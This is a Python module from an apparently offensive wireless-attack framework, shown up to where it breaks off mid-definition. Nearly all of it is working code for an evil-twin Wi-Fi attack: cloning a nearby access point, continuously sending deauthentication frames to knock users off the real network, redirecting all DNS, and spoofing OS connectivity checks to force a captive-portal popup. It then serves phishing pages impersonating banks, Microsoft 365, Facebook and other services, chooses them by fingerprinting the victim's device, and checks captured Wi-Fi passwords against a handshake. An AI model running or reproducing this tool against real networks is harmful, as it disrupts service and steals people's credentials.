#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek - https://github.com/Uniao-Geek
"""Phishing Engine - native evil twin + captive portal.

Incorporates the best techniques from wifiphisher and fluxion as pure
Python-native code. Full orchestration of:
  - AP scanning via Scapy beacon/probe-response sniffer
  - Evil twin AP via hostapd (dynamic config generation)
  - Continuous deauthentication (flood_engine_native or inline Scapy)
  - Captive DNS/DHCP (dns_dhcp_server module or dnslib fallback)
  - HTTP server with OS/language-aware template auto-selection
  - WPA handshake verification via aircrack-ng stdin (Fluxion style)
  - Secure JSON credential logging (no plaintext in system logs)

23 built-in captive templates with OS fingerprinting and language detection.
Connectivity check spoofing forces the captive portal popup on all major OSes
(iOS CNA, Android/Chrome, Windows NLA).

Requires: Python 3.8+, Scapy, hostapd.
Optional: flood_engine_native, dns_dhcp_server, dnslib, aircrack-ng.

Version: 1.0.0
"""

from __future__ import annotations

import hashlib
import http.server
import json
import logging
import os
import shutil
import socketserver
import subprocess
import threading
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptMAC,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
)
from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_TEMPLATE_DIR: str = os.path.normpath(
    os.path.join(
        os.path.dirname(__file__),
        "..", "..", "..", "resources", "captive_templates",
    )
)

_AVAILABLE_TEMPLATES: List[str] = [
    "airport_wifi",
    "apple_captive",
    "banking_update",
    "cloud_storage",
    "coffee_shop",
    "corporate_8021x",
    "facebook",
    "firmware_update",
    "google_wifi",
    "hotel_wifi",
    "instagram",
    "isp_login",
    "linkedin",
    "mfa_portal",
    "microsoft_365",
    "netflix",
    "public_library",
    "router_admin",
    "shopping_mall",
    "twitter_x",
    "university_campus",
    "vpn_login",
    "whatsapp_web",
]

# Connectivity check host -> (status_code, body, content_type)
# Returning the expected response forces the OS captive portal popup.
_CONNECTIVITY_CHECKS: Dict[str, tuple] = {
    # Apple - iOS CNA / macOS Captive Network Assistant
    "captive.apple.com": (
        200,
        b"<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>",
        "text/html",
    ),
    "www.apple.com": (
        200,
        b"<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>",
        "text/html",
    ),
    # Google - Android / ChromeOS captive portal detection
    "connectivitycheck.gstatic.com": (204, b"", "text/plain"),
    "clients3.google.com": (204, b"", "text/plain"),
    "connectivitycheck.android.com": (204, b"", "text/plain"),
    "clients1.google.com": (204, b"", "text/plain"),
    # Microsoft - Windows NLA / NCSI
    "www.msftconnecttest.com": (200, b"Microsoft Connect Test", "text/plain"),
    "ipv6.msftconnecttest.com": (200, b"Microsoft Connect Test", "text/plain"),
    "www.msftncsi.com": (200, b"Microsoft NCSI", "text/plain"),
}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _sha256_hex(value: str) -> str:
    """Return hex-encoded SHA-256 of value."""
    return hashlib.sha256(value.encode("utf-8", errors="replace")).hexdigest()


def _discover_available_templates() -> List[str]:
    """Return template names that have an index.html on disk."""
    found: List[str] = []
    if os.path.isdir(_TEMPLATE_DIR):
        for entry in sorted(os.listdir(_TEMPLATE_DIR)):
            index = os.path.join(_TEMPLATE_DIR, entry, "index.html")
            if os.path.isfile(index):
                found.append(entry)
    return found if found else list(_AVAILABLE_TEMPLATES)


def _resolve_client_mac(client_ip: str) -> str:
    """Best-effort: resolve IP to MAC via system ARP table."""
    try:
        result = subprocess.run(
            ["arp", "-n", client_ip],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            timeout=2,
        )
        for line in result.stdout.decode("utf-8", errors="replace").splitlines():
            parts = line.split()
            if len(parts) >= 3 and parts[0] == client_ip:
                return parts[2]
    except Exception:
        pass
    return "unknown"


def _select_template(
    user_agent: str,
    accept_lang: str,
    available: List[str],
    default: str = "router_admin",
) -> str:
    """Auto-select phishing template based on client OS/browser fingerprint.

    Args:
        user_agent: HTTP User-Agent header value.
        accept_lang: HTTP Accept-Language header value.
        available: List of available template names on disk.
        default: Fallback template name when no match is found.

    Returns:
        Template name best matching the client fingerprint.
    """
    ua = user_agent.lower()
    lang_raw = (
        accept_lang.split(",")[0].split(";")[0].strip().lower()
        if accept_lang
        else "en"
    )
    lang = lang_raw[:2]

    # OS-based priority
    if "android" in ua or "linux; android" in ua:
        candidate = "google_wifi"
    elif "iphone" in ua or "ipad" in ua or "ipod" in ua:
        candidate = "apple_captive"
    elif "windows" in ua:
        candidate = "microsoft_365"
    elif "macintosh" in ua or "mac os x" in ua:
        candidate = "apple_captive"
    else:
        candidate = default

    if candidate in available:
        return candidate

    # Language-based secondary selection
    lang_fallback: Dict[str, str] = {
        "pt": "isp_login",
        "es": "router_admin",
        "fr": "hotel_wifi",
        "de": "corporate_8021x",
        "it": "router_admin",
        "ja": "router_admin",
        "zh": "router_admin",
        "ko": "router_admin",
        "ru": "router_admin",
        "ar": "router_admin",
    }
    tpl = lang_fallback.get(lang, default)
    if tpl in available:
        return tpl

    return default if default in available else (available[0] if available else "router_admin")


# ---------------------------------------------------------------------------
# Credential store
# ---------------------------------------------------------------------------

class _CredentialStore:
    """Thread-safe, append-only credential store persisted as JSON.

    Passwords are never written to system logs or stored in plaintext.
    Only their SHA-256 digest is retained alongside metadata.
    """

    def __init__(self, output_file: str) -> None:
        self._lock = threading.Lock()
        self._entries: List[Dict] = []
        self._path = output_file
        os.makedirs(os.path.dirname(os.path.abspath(output_file)) or ".", exist_ok=True)

    def add(
        self,
        client_mac: str,
        credential: str,
        extra: Optional[Dict] = None,
    ) -> None:
        """Record a captured credential.

        Args:
            client_mac: Client MAC address or 'unknown'.
            credential: The submitted password/credential (stored as hash only).
            extra: Optional metadata dict (must not contain raw password).
        """
        entry: Dict = {
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "client_mac": client_mac,
            "credential_sha256": _sha256_hex(credential),
        }
        if extra:
            safe_extra = {k: v for k, v in extra.items() if k not in ("password", "credential")}
            entry.update(safe_extra)

        with self._lock:
            self._entries.append(entry)
            try:
                with open(self._path, "w", encoding="utf-8") as fh:
                    json.dump(self._entries, fh, indent=2, ensure_ascii=False)
            except OSError as exc:
                logger.error("Failed to persist credentials: %s", exc)

        logger.info(
            "Credential from %s stored (digest: %s...)",
            client_mac,
            entry["credential_sha256"][:12],
        )

    @property
    def count(self) -> int:
        """Return total number of credentials captured."""
        with self._lock:
            return len(self._entries)

    @property
    def all(self) -> List[Dict]:
        """Return a snapshot of all stored entries."""
        with self._lock:
            return list(self._entries)


# ---------------------------------------------------------------------------
# AP scanner
# ---------------------------------------------------------------------------

@dataclass
class ScannedAP:
    """Represents a discovered access point from beacon/probe-response frames."""

    bssid: str
    ssid: str
    channel: int
    rssi: int
    encryption: str
    clients: Set[str] = field(default_factory=set)

    def __str__(self) -> str:
        enc = self.encryption or "OPEN"
        return (
            f"BSSID={self.bssid}  SSID={self.ssid!r:32s}  "
            f"CH={self.channel:2d}  RSSI={self.rssi:4d}dBm  "
            f"ENC={enc:8s}  CLIENTS={len(self.clients)}"
        )


class APScanner:
    """Scapy-based beacon and probe-response sniffer to enumerate nearby APs."""

    def __init__(self, interface: str, timeout: int = 15) -> None:
        self._iface = interface
        self._timeout = timeout
        self._aps: Dict[str, ScannedAP] = {}
        self._lock = threading.Lock()

    def _handle_packet(self, pkt) -> None:  # type: ignore[no-untyped-def]
        """Parse each sniffed packet and extract AP and client metadata."""
        try:
            from scapy.layers.dot11 import (
                Dot11,
                Dot11Beacon,
                Dot11ProbeResp,
                RadioTap,
            )
        except ImportError:
            return

        if not pkt.haslayer(Dot11):
            return

        dot11 = pkt[Dot11]

        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            bssid = dot11.addr3
            if not bssid or bssid == "ff:ff:ff:ff:ff:ff":
                return

            ssid = ""
            channel = 0
            encryption = "OPEN"

            # Walk the Dot11Elt chain
            try:
                elt = dot11.payload.payload
                while elt and hasattr(elt, "ID"):
                    if elt.ID == 0:
                        try:
                            ssid = elt.info.decode("utf-8", errors="replace")
                        except Exception:
                            ssid = str(elt.info)
                    elif elt.ID == 3:
                        channel = int.from_bytes(bytes(elt.info)[:1], "big")
                    elif elt.ID == 48:
                        encryption = "WPA2"
                    elif elt.ID == 221:
                        raw = bytes(elt.info)
                        if raw[:3] == b"\x00P\xf2" and encryption != "WPA2":
                            encryption = "WPA"
                    try:
                        elt = elt.payload
                    except Exception:
                        break
            except Exception:
                pass

            rssi = -100
            if pkt.haslayer(RadioTap):
                try:
                    rssi = int(pkt[RadioTap].dBm_AntSignal)
                except Exception:
                    pass

            with self._lock:
                if bssid not in self._aps:
                    self._aps[bssid] = ScannedAP(
                        bssid=bssid,
                        ssid=ssid,
                        channel=channel,
                        rssi=rssi,
                        encryption=encryption,
                    )
                else:
                    ap = self._aps[bssid]
                    if rssi > ap.rssi:
                        ap.rssi = rssi
                    if ssid and not ap.ssid:
                        ap.ssid = ssid

        elif dot11.type == 2:
            # Data frame - track client association
            bssid = dot11.addr3
            src = dot11.addr2
            if bssid and src and src != bssid:
                with self._lock:
                    if bssid in self._aps:
                        self._aps[bssid].clients.add(src)

    def scan(self) -> List[ScannedAP]:
        """Run the sniffer and return APs sorted by signal strength.

        Returns:
            List of ScannedAP ordered by RSSI descending.
        """
        try:
            from scapy.all import sniff
        except ImportError:
            logger.error("Scapy not available. Install: pip install scapy")
            return []

        logger.info("Scanning on %s for %ds...", self._iface, self._timeout)
        try:
            sniff(
                iface=self._iface,
                prn=self._handle_packet,
                timeout=self._timeout,
                store=False,
            )
        except PermissionError:
            logger.error("Root privileges required for raw packet capture.")
        except OSError as exc:
            logger.error("Interface error during scan: %s", exc)

        with self._lock:
            return sorted(self._aps.values(), key=lambda ap: ap.rssi, reverse=True)


# ---------------------------------------------------------------------------
# Hostapd manager
# ---------------------------------------------------------------------------

class HostapdManager:
    """Manages the hostapd subprocess that creates the evil twin AP."""

    def __init__(
        self, iface: str, ssid: str, channel: int, tmp_dir: str
    ) -> None:
        self._iface = iface
        self._ssid = ssid
        self._channel = channel
        self._conf_path = os.path.join(tmp_dir, "wxf-hostapd.conf")
        self._proc: Optional[subprocess.Popen] = None  # type: ignore[type-arg]

    def _generate_conf(self) -> str:
        """Write hostapd.conf for an open-authentication evil twin.

        Returns:
            Absolute path to the generated configuration file.
        """
        content = (
            f"interface={self._iface}\n"
            f"driver=nl80211\n"
            f"ssid={self._ssid}\n"
            f"hw_mode=g\n"
            f"channel={self._channel}\n"
            f"wmm_enabled=0\n"
            f"macaddr_acl=0\n"
            f"auth_algs=1\n"
            f"ignore_broadcast_ssid=0\n"
            f"beacon_int=100\n"
        )
        with open(self._conf_path, "w", encoding="utf-8") as fh:
            fh.write(content)
        logger.debug("hostapd conf written to %s", self._conf_path)
        return self._conf_path

    def start(self) -> bool:
        """Start hostapd subprocess.

        Returns:
            True if hostapd launched and is still running after 2 seconds.
        """
        hostapd_bin = shutil.which("hostapd")
        if not hostapd_bin:
            logger.error("hostapd not found. Install: apt install hostapd")
            return False

        conf = self._generate_conf()
        try:
            self._proc = subprocess.Popen(
                [hostapd_bin, conf],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            time.sleep(2)
            if self._proc.poll() is not None:
                logger.error(
                    "hostapd exited immediately (code=%d). Check interface and conf.",
                    self._proc.returncode,
                )
                return False
            logger.info(
                "hostapd started (PID %d) SSID=%r CH=%d",
                self._proc.pid,
                self._ssid,
                self._channel,
            )
            return True
        except OSError as exc:
            logger.error("Failed to start hostapd: %s", exc)
            return False

    def stop(self) -> None:
        """Terminate hostapd and remove the temporary config file."""
        if self._proc and self._proc.poll() is None:
            self._proc.terminate()
            try:
                self._proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._proc.kill()
        self._proc = None
        if os.path.isfile(self._conf_path):
            try:
                os.remove(self._conf_path)
            except OSError:
                pass


# ---------------------------------------------------------------------------
# Deauth worker
# ---------------------------------------------------------------------------

class DeauthWorker:
    """Continuous 802.11 deauthentication thread against the real AP.

    Attempts to import send_deauth from flood_engine_native first.
    Falls back to an inline Scapy implementation when that module is absent.
    """

    def __init__(
        self,
        iface_mon: str,
        target_bssid: str,
        interval: float = 0.5,
    ) -> None:
        self._iface = iface_mon
        self._bssid = target_bssid
        self._interval = interval
        self._stop_evt = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._send_fn = self._resolve_backend()

    @staticmethod
    def _resolve_backend():
        """Resolve deauth sender: flood_engine_native or Scapy inline.

        Returns:
            Callable(iface, bssid) or None if no backend is available.
        """
        try:
            from wirelessxpl.modules.generic.wifi.flood_engine_native import (  # type: ignore[import]
                send_deauth,
            )
            logger.debug("DeauthWorker: using flood_engine_native.send_deauth")
            return send_deauth
        except ImportError:
            pass

        try:
            from scapy.all import sendp
            from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

            def _scapy_deauth(
                iface: str,
                bssid: str,
                client: str = "ff:ff:ff:ff:ff:ff",
            ) -> None:
                pkt = (
                    RadioTap()
                    / Dot11(
                        addr1=client,
                        addr2=bssid,
                        addr3=bssid,
                        type=0,
                        subtype=12,
                    )
                    / Dot11Deauth(reason=7)
                )
                sendp(pkt, iface=iface, count=5, inter=0.05, verbose=False)

            logger.debug("DeauthWorker: using inline Scapy deauth")
            return _scapy_deauth
        except ImportError:
            logger.warning("Scapy not available. Deauth worker disabled.")
            return None

    def _loop(self) -> None:
        while not self._stop_evt.is_set():
            if self._send_fn is not None:
                try:
                    self._send_fn(self._iface, self._bssid)
                except Exception as exc:
                    logger.debug("Deauth frame error: %s", exc)
            self._stop_evt.wait(self._interval)

    def start(self) -> None:
        """Start the deauth loop in a daemon thread."""
        if not self._send_fn:
            logger.warning("No deauth backend available. Skipping deauth worker.")
            return
        self._stop_evt.clear()
        self._thread = threading.Thread(
            target=self._loop,
            daemon=True,
            name="wxf-deauth",
        )
        self._thread.start()
        logger.info("DeauthWorker started against BSSID %s", self._bssid)

    def stop(self) -> None:
        """Signal the loop to exit and join the thread."""
        self._stop_evt.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3)
        self._thread = None


# ---------------------------------------------------------------------------
# Captive network stack (DNS + DHCP)
# ---------------------------------------------------------------------------

class CaptiveNetworkStack:
    """DNS and DHCP services for the captive portal.

    Attempts dns_dhcp_server module first, then falls back to dnslib.
    All DNS queries are redirected to the portal IP.
    """

    def __init__(
        self,
        iface: str,
        portal_ip: str,
        dhcp_start: str,
        dhcp_end: str,
    ) -> None:
        self._iface = iface
        self._portal_ip = portal_ip
        self._dhcp_start = dhcp_start
        self._dhcp_end = dhcp_end
        self._threads: List[threading.Thread] = []
        self._stop_evt = threading.Event()

    def start(self) -> bool:
        """Start DNS/DHCP. Returns True when at least the DNS redirect is active.

        Returns:
            True if DNS redirect started successfully.
        """
        try:
            from wirelessxpl.modules.generic.wifi.dns_dhcp_server import (  # type: ignore[import]
                CaptiveDHCPServer,
                CaptiveDNSServer,
            )
            dns = CaptiveDNSServer(iface=self._iface, redirect_ip=self._portal_ip)
            dhcp = CaptiveDHCPServer(
                iface=self._iface,
                server_ip=self._portal_ip,
                range_start=self._dhcp_start,
                range_end=self._dhcp_end,
            )
            t_dns = threading.Thread(
                target=dns.serve_forever, daemon=True, name="wxf-dns"
            )
            t_dhcp = threading.Thread(
                target=dhcp.serve_forever, daemon=True, name="wxf-dhcp"
            )
            t_dns.start()
            t_dhcp.start()
            self._threads.extend([t_dns, t_dhcp])
            logger.info("CaptiveNetworkStack: dns_dhcp_server module active")
            return True
        except ImportError:
            pass

        return self._start_dnslib_fallback()

    def _start_dnslib_fallback(self) -> bool:
        """Minimal DNS redirect via dnslib when dns_dhcp_server is absent.

        Returns:
            True if the dnslib server started successfully.
        """
        try:
            from dnslib import A, QTYPE, RR  # type: ignore[import]
            from dnslib.server import BaseResolver, DNSServer  # type: ignore[import]

            redirect_ip = self._portal_ip

            class _AllRedirectResolver(BaseResolver):
                def resolve(self, request, handler):  # type: ignore[override]
                    reply = request.reply()
                    reply.add_answer(
                        RR(
                            rname=request.q.qname,
                            rtype=QTYPE.A,
                            rdata=A(redirect_ip),
                            ttl=1,
                        )
                    )
                    return reply

            server = DNSServer(_AllRedirectResolver(), port=53, address="0.0.0.0")
            t = threading.Thread(
                target=server.start, daemon=True, name="wxf-dns-dnslib"
            )
            t.start()
            self._threads.append(t)
            logger.info("CaptiveNetworkStack: dnslib DNS redirect active on :53")
            return True
        except ImportError:
            logger.warning(
                "dnslib not available. DNS redirect disabled. "
                "Install: pip install dnslib"
            )
        except OSError as exc:
            logger.error("DNS server bind error: %s", exc)
        return False

    def stop(self) -> None:
        """Signal stop (daemon threads will exit with the process)."""
        self._stop_evt.set()


# ---------------------------------------------------------------------------
# Handshake verifier (Fluxion style)
# ---------------------------------------------------------------------------

class HandshakeVerifier:
    """Verify a submitted password against a captured WPA handshake.

    Uses aircrack-ng with the password delivered via stdin (-w -) so that
    no password ever touches the filesystem.
    """

    def __init__(self, handshake_pcap: str, bssid: str) -> None:
        self._pcap = handshake_pcap
        self._bssid = bssid
        self._verified_password: Optional[str] = None
        self._lock = threading.Lock()

    @property
    def is_verified(self) -> bool:
        """True when a password has been confirmed against the handshake."""
        with self._lock:
            return self._verified_password is not None

    def verify(self, candidate: str) -> bool:
        """Test candidate against the captured handshake.

        Args:
            candidate: Password string submitted by the victim.

        Returns:
            True if aircrack-ng confirms the password matches.
        """
        aircrack_bin = shutil.which("aircrack-ng")
        if not aircrack_bin:
            logger.warning("aircrack-ng not found. Handshake verification skipped.")
            return False

        if not os.path.isfile(self._pcap):
            logger.warning("Handshake file not found: %s", self._pcap)
            return False

        try:
            result = subprocess.run(
                [aircrack_bin, "-b", self._bssid, "-w", "-", self._pcap],
                input=candidate.encode("utf-8", errors="replace"),
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                timeout=30,
            )
            output = result.stdout.decode("utf-8", errors="replace")
            if "KEY FOUND" in output:
                with self._lock:
                    self._verified_password = candidate
                logger.info("Handshake verified successfully.")
                return True
        except subprocess.TimeoutExpired:
            logger.debug("aircrack-ng timed out for candidate.")
        except OSError as exc:
            logger.debug("aircrack-ng execution error: %s", exc)

        return False


# ---------------------------------------------------------------------------
# HTTP phishing server
# ---------------------------------------------------------------------------

def _build_fallback_html(ssid: str) -> bytes:
    """Generate a minimal fallback portal page when no template is found.

    Args:
        ssid: Network name to display in the portal.

    Returns:
        UTF-8 encoded HTML bytes.
    """
    return (
        "<!DOCTYPE html><html lang='en'>"
        "<head><meta charset='utf-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
        "<title>Wi-Fi Authentication</title>"
        "<style>"
        "*{margin:0;padding:0;box-sizing:border-box}"
        "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;"
        "background:#f5f5f7;display:flex;align-items:center;"
        "justify-content:center;min-height:100vh}"
        ".box{background:#fff;border-radius:14px;"
        "box-shadow:0 4px 32px rgba(0,0,0,.12);"
        "padding:2.5rem;max-width:380px;width:90%;text-align:center}"
        "h2{margin-bottom:.5rem;font-size:1.25rem;color:#1d1d1f}"
        "p{color:#6e6e73;font-size:.9rem;margin-bottom:1.5rem}"
        "input{width:100%;padding:.75rem 1rem;border:1px solid #d2d2d7;"
        "border-radius:10px;font-size:1rem;margin-bottom:1rem;outline:none}"
        "button{width:100%;padding:.8rem;background:#007aff;color:#fff;"
        "border:none;border-radius:10px;font-size:1rem;cursor:pointer}"
        "button:hover{background:#0056b3}"
        "</style></head>"
        "<body><div class='box'>"
        f"<h2>Connect to {ssid}</h2>"
        "<p>Enter the network password to continue.</p>"
        "<form method='POST' action='/capture'>"
        "<input type='password' name='password' placeholder='Wi-Fi Password'"
        " required minlength='8' maxlength='63'>"
        "<button type='submit'>Connect</button>"
        "</form></div></body></html>"
    ).encode("utf-8")


class PhishingHTTPServer:
    """HTTP server that serves captive portal templates and captures credentials.

    Handles:
      - GET /             portal page (template auto-selected by UA + language)
      - GET /success.html post-capture success page
      - POST /capture     credential submission
      - any host matching _CONNECTIVITY_CHECKS: OS popup trigger response
    """

    def __init__(
        self,
        portal_ip: str,
        port: int,
        ssid: str,
        template_name: str,
        cred_store: _CredentialStore,
        handshake_verifier: Optional[HandshakeVerifier],
        stop_event: threading.Event,
        available_templates: List[str],
    ) -> None:
        self._portal_ip = portal_ip
        self._port = port
        self._ssid = ssid
        self._template_name = template_name
        self._cred_store = cred_store
        self._verifier = handshake_verifier
        self._stop_event = stop_event
        self._available = available_templates
        self._httpd: Optional[socketserver.TCPServer] = None
        self._thread: Optional[threading.Thread] = None
        self._template_cache: Dict[str, bytes] = {}

    def _load_template(self, name: str) -> bytes:
        """Return cached template bytes, loading from disk on first access.

        Args:
            name: Template directory name under captive_templates/.

        Returns:
            Template HTML as bytes.
        """
        if name in self._template_cache:
            return self._template_cache[name]

        tpl_path = os.path.join(_TEMPLATE_DIR, name, "index.html")
        if os.path.isfile(tpl_path):
            try:
                with open(tpl_path, "rb") as fh:
                    content = fh.read()
            except OSError:
                content = _build_fallback_html(self._ssid)
        else:
            content = _build_fallback_html(self._ssid)

        self._template_cache[name] = content
        return content

    def _make_handler(self):  # type: ignore[return]
        """Build the HTTP request handler class bound to this server's context."""
        cred_store = self._cred_store
        verifier = self._verifier
        stop_event = self._stop_event
        available = self._available
        load_template = self._load_template
        default_template = self._template_name
        ssid = self._ssid

        class _Handler(http.server.BaseHTTPRequestHandler):
            """Request handler for captive portal, credential capture, and OS checks."""

            # Masquerade as a common web server to avoid fingerprinting
            server_version = "nginx/1.24.0"
            sys_version = ""

            def _pick_template(self) -> str:
                ua = self.headers.get("User-Agent", "")
                lang = self.headers.get("Accept-Language", "")
                return _select_template(ua, lang, available, default_template)

            def _connectivity_response(self) -> Optional[tuple]:
                """Return (status, body, ctype) if this request is an OS check.

                Returns:
                    Tuple for the connectivity check or None.
                """
                host = self.headers.get("Host", "").split(":")[0].strip().lower()
                for check_host, response in _CONNECTIVITY_CHECKS.items():
                    if host == check_host.lower():
                        return response
                return None

            def do_GET(self) -> None:  # noqa: N802
                conn_resp = self._connectivity_response()
                if conn_resp is not None:
                    status, body, ctype = conn_resp
                    self.send_response(status)
                    self.send_header("Content-Type", ctype)
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    if body:
                        self.wfile.write(body)
                    return

                if self.path.startswith("/success"):
                    body = (
                        b"<!DOCTYPE html><html><head><meta charset='utf-8'>"
                        b"<title>Connected</title></head>"
                        b"<body style='font-family:sans-serif;display:flex;"
                        b"align-items:center;justify-content:center;min-height:100vh'>"
                        b"<div style='text-align:center'>"
                        b"<h2>You are connected!</h2>"
                        b"<p>Enjoy the network.</p>"
                        b"</div></body></html>"
                    )
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html; charset=utf-8")
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
                    return

                tpl = self._pick_template()
                body = load_template(tpl)
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
                self.end_headers()
                self.wfile.write(body)

            def do_POST(self) -> None:  # noqa: N802
                raw_len = self.headers.get("Content-Length", "0")
                try:
                    content_length = max(0, min(int(raw_len), 8192))
                except (ValueError, TypeError):
                    content_length = 0

                body_raw = self.rfile.read(content_length)
                try:
                    params = urllib.parse.parse_qs(
                        body_raw.decode("utf-8", errors="replace"),
                        max_num_fields=30,
                    )
                except Exception:
                    params = {}

                password = params.get("password", [""])[0][:128]
                username_raw = params.get(
                    "username", params.get("email", params.get("user", [""])
                ))[0][:128]

                client_ip = self.client_address[0]
                client_mac = _resolve_client_mac(client_ip)

                extra = {
                    "client_ip": client_ip,
                    "username_sha256": _sha256_hex(username_raw) if username_raw else "",
                    "user_agent": self.headers.get("User-Agent", "")[:256],
                }
                cred_store.add(client_mac, password, extra)

                print_success(
                    f"Credential #{cred_store.count} from {client_ip} "
                    f"({client_mac}) - digest {_sha256_hex(password)[:12]}..."
                )

                if verifier and password and not verifier.is_verified:
                    if verifier.verify(password):
                        print_success("HANDSHAKE VERIFIED - operator can safely close the portal.")
                        stop_event.set()

                self.send_response(302)
                self.send_header("Location", "/success.html")
                self.end_headers()

            def log_message(self, format: str, *args) -> None:  # type: ignore[override]
                logger.debug(
                    "HTTP %s %s",
                    getattr(self, "path", "-"),
                    self.headers.get("Host", "-"),
                )

        return _Handler

    def start(self) -> bool:
        """Start the HTTP server in a daemon thread.

        Returns:
            True if the server bound and started successfully.
        """
        try:
            socketserver.TCPServer.allow_reuse_address = True
            handler = self._make_handler()
            self._httpd = socketserver.TCPServer(("0.0.0.0", self._port), handler)
            self._thread = threading.Thread(
                target=self._httpd.serve_forever,
                daemon=True,
                name="wxf-http",
            )
            self._thread.start()
            logger.info("PhishingHTTPServer listening on 0.0.0.0:%d", self._port)
            return True
        except OSError as exc:
            logger.error("HTTP server failed to bind :%d - %s", self._port, exc)
            return False

    def stop(self) -> None:
        """Shutdown the HTTP server and join the thread."""
        if self._httpd:
            self._httpd.shutdown()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=5)


# ---------------------------------------------------------------------------
# Main orchestrator
# ---------------------------------------------------------------------------

class PhishingEngine:
    """Orchestrates the full evil twin + captive portal attack stack.

    Attack sequence:
      1. Configure rogue AP interface IP
      2. Start hostapd evil twin
      3. Start captive DNS/DHCP
      4. Start HTTP phishing portal
      5. Start deauth worker (optional)
      6. Block until stop event or KeyboardInterrupt
      7. Tear down all components in reverse order
    """

    def __init__(
        self,
        interface_ap: str,
        interface_mon: str,
        ssid: str,
        channel: int,
        bssid: str,
        template: str,
        portal_ip: str,
        dhcp_start: str,
        dhcp_end: str,
        http_port: int,
        output_file: str,
        verify_handshake: bool,
        handshake_pcap: str,
        deauth_continuous: bool,
        tmp_dir: str,
    ) -> None:
        os.makedirs(tmp_dir, exist_ok=True)

        self._stop_event = threading.Event()
        self._cred_store = _CredentialStore(output_file)
        self._output_file = output_file

        verifier: Optional[HandshakeVerifier] = None
        if verify_handshake and handshake_pcap and os.path.isfile(handshake_pcap):
            verifier = HandshakeVerifier(handshake_pcap, bssid)

        available = _discover_available_templates()

        self._hostapd = HostapdManager(interface_ap, ssid, channel, tmp_dir)
        self._deauth: Optional[DeauthWorker] = (
            DeauthWorker(interface_mon, bssid)
            if deauth_continuous and bssid and bssid != "00:00:00:00:00:00"
            else None
        )
        self._captive_net = CaptiveNetworkStack(
            interface_ap, portal_ip, dhcp_start, dhcp_end
        )
        self._http = PhishingHTTPServer(
            portal_ip=portal_ip,
            port=http_port,
            ssid=ssid,
            template_name=template,
            cred_store=self._cred_store,
            handshake_verifier=verifier,
            stop_event=self._stop_event,
            available_templates=available,
        )
        self._interface_ap = interface_ap
        self._portal_ip = portal_ip

    def _setup_interface(self) -> None:
        """Assign portal IP to the AP interface."""
        cmds = [
            ["ip", "addr", "flush", "dev", self._interface_ap],
            ["ip", "addr", "add", f"{self._portal_ip}/24", "dev", self._interface_ap],
            ["ip", "link", "set", self._interface_ap, "up"],
        ]
        for cmd in cmds:
            try:
                subprocess.run(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=5,
                )
            except Exception as exc:
                logger.debug("Interface cmd %s: %s", " ".join(cmd), exc)

    def _teardown(self) -> None:
        """Stop all components in reverse startup order."""
        if self._deauth:
            self._deauth.stop()
        self._http.stop()
        self._captive_net.stop()
        self._hostapd.stop()
        logger.info("PhishingEngine teardown complete.")

    def run(self) -> None:
        """Launch the attack stack and block until stop or Ctrl-C."""
        try:
            self._setup_interface()

            if not self._hostapd.start():
                print_error("hostapd failed to start. Aborting.")
                return

            if not self._captive_net.start():
                print_error("DNS/DHCP stack unavailable. Clients may not redirect.")

            if not self._http.start():
                print_error("HTTP server failed to bind. Aborting.")
                self._hostapd.stop()
                return

            if self._deauth:
                self._deauth.start()

            print_success("PhishingEngine is LIVE. Press Ctrl+C to stop.")

            while not self._stop_event.is_set():
                time.sleep(1)

        except KeyboardInterrupt:
            print_status("\nShutdown requested.")
        finally:
            self._teardown()

        print_info(f"Total credentials captured: {self._cred_store.count}")
        print_info(f"Output: {self._output_file}")


# ---------------------------------------------------------------------------
# WXF Module API
# ---------------------------------------------------------------------------

class Exploit(Exploit):
    """Phishing Engine - native evil twin + captive portal orchestrator.

    Wifiphisher-style AP scanning + portal serving combined with
    Fluxion-style handshake verification. All components are pure Python;
    hostapd is accepted as a system dependency.
    """

    __info__ = {
        "name": "Phishing Engine",
        "description": (
            "Native evil twin + captive portal incorporating wifiphisher and "
            "fluxion techniques. Scapy beacon/probe scanner, hostapd evil twin "
            "cloning (dynamic config), continuous Scapy deauth, Python-native "
            "DNS/DHCP captive stack, HTTP server with 23 i18n templates, OS "
            "fingerprinting for template auto-selection, connectivity check "
            "spoofing (iOS CNA / Android / Windows NLA popup trigger), and "
            "Fluxion-style aircrack-ng stdin handshake verification. Credentials "
            "stored as JSON with SHA-256 only (no plaintext logging)."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://github.com/wifiphisher/wifiphisher",
            "https://github.com/FluxionNetwork/fluxion",
        ),
        "devices": ("wifi", "802.11"),
    }

    mode = OptString(
